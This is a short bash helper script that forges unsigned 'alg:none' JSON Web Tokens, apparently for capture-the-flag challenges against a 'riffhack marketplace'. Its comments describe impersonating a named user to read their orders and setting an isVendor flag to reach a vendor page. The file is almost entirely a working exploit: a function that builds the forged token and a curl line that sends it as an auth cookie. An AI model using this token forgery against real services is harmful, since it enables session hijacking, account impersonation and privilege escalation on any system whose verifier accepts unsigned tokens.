#!/usr/bin/env bash
# lib/jwt-none.sh — forge an alg:none JWT for the riffhack marketplace.
#
# Every endpoint that reads the `auth-token` cookie accepts a token whose
# header declares `alg:"none"` — i.e., no signature. The verifier never
# enforces a signing algorithm, so a token with a base64-encoded header
# `{"alg":"none","typ":"JWT"}` and any payload is treated as a valid session.
#
# This is what powers web7 (forge as `k7m3n` and read their orders), as well
# as the boroCTF "Vendor's Secret Door" challenge (forge `isVendor:true` and
# read /vendor).
#
# Usage:
#   source lib/jwt-none.sh
#   TOKEN=$(forge_jwt_none "k7m3n" false)
#   curl -sk -b "auth-token=$TOKEN" "http://<host>/api/orders"

forge_jwt_none() {
  local id="$1"
  local is_vendor="${2:-false}"
  local email="${3:-x@x}"

  local header payload
  header=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  payload=$(printf '{"id":"%s","email":"%s","isVendor":%s,"iat":1,"exp":1782503527}' \
            "$id" "$email" "$is_vendor" \
            | base64 | tr '+/' '-_' | tr -d '=')

  # The trailing dot represents the empty signature segment.
  printf '%s.%s.' "$header" "$payload"
}
